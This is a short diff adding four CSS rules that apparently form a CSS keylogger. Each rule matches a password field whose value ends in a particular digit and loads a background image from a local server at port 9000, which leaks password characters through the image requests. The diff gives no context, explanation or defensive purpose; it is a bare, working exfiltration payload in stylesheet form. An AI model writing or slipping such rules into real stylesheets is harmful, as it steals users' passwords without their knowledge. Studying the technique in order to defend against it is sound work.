@@ -1,0 +1,4 @@
+input[type="password"][value$="1"]{background-image: url("http://localhost:9000/1");}
+input[type="password"][value$="2"]{background-image: url("http://localhost:9000/2");}
+input[type="password"][value$="3"]{background-image: url("http://localhost:9000/3");}
+input[type="password"][value$="4"]{background-image: url("http://localhost:9000/4");}
